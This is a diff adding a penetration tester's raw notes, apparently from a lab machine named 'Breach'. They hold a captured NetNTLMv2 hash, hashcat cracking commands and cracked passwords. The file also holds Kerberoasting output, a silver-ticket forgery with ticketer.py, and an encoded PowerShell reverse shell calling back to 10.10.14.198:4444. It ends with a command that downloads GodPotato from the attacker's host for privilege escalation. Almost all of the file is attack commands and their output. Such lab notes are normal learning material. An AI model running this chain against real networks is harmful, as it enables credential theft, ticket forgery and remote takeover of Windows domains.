@@ -1,0 +1,75 @@
+Julia.Wong::BREACH:c99552b5fa75acbe:F6CE4FD9967C74CBE8BF31A1DD038C1A:01010000000000000025F3245C74DC01A1CA3AE6FD6804D40000000002000800560034004400390001001E00570049004E002D00540033004700340059004400340052004F004400440004003400570049004E002D00540033004700340059004400340052004F00440044002E0056003400440039002E004C004F00430041004C000300140056003400440039002E004C004F00430041004C000500140056003400440039002E004C004F00430041004C00070008000025F3245C74DC01060004000200000008003000300000000000000001000000002000007B1EFB7987CE82E349AE076E5EEFF285D1ECC7C76424842D570F5B21FA6667220A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200350032000000000000000000
+
+
+Computer1 <- julia's pass
+
+https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
+
+└─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --show   
+kerberoastable accounts
+MATCH (n:User)WHERE n.hasspn=true
+RETURN n
+
+
+
+└─$ python3 GetUserSPNs.py breach.vl/julia.wong:'Computer1' -dc-ip $HTBHOST -r
+equest -output julia_tgs.txt
+
+
+└─$ hashcat -m 13100 julia_tgs.txt /usr/share/wordlists/rockyou.txt
+Trustno1
+
+bloodhound
+admin
+Helloworld123!
+
+pypykatz crypto nt password
+
+└─$ python3 GetUserSPNs.py breach.vl/julia.wong:'Computer1' -dc-ip $HTBHOST -r
+equest -output julia_tgs.txt
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName              Name       MemberOf  PasswordLastSet        
+     LastLogon                   Delegation 
+--------------------------------  ---------  --------  -----------------------
+---  --------------------------  ----------
+MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 05:43:08.106
+169  2025-12-23 22:17:09.913366             
+
+
+
+1) using the credentials, do a silver ticket attack. to do this, i need the ntlm hash and domain sid. 
+    - [x] ntlm hash is rc4 encryption
+        69596c7aa1e8daee17f8e78870e25a5c
+    - [ ] get sid of the user
+        S-1-5-21-2330692793-3312915120-706255856-500
+        from bloodhound 
+    - [ ] tool that we use is ticketer.py
+    - [ ] spn is 
+        MSSQLSvc/breachdc.breach.vl:1433
+
+└─$ python3 ticketer.py -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21
+-2330692793-3312915120-706255856-500 -domain breachdc.breach.vl -spn MSSQLSvc/breachd
+c.breach.vl:1433 Administrator <-- wrong command, do not include 500 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+there is an env variable called KRB5CCNAME 
+
+need to use no-pass?
+
+
+└─$ KRB5CCNAME=Administrator.ccache python3 mssqlclient.py -k breachdc.breach.vl 
+
+
+powershell -e 
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA5ADgAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+
+from revshell.com
+
+
+xp_cmdshell after reconfigure and do privesc 
+SeImpersonatePrivilege 
+
+
+Invoke-WebRequest -Uri "http://10.10.14.198:8000/GodPotato-NET4.exe" -OutFile "C:\Windows\tasks\gp.exe"
+
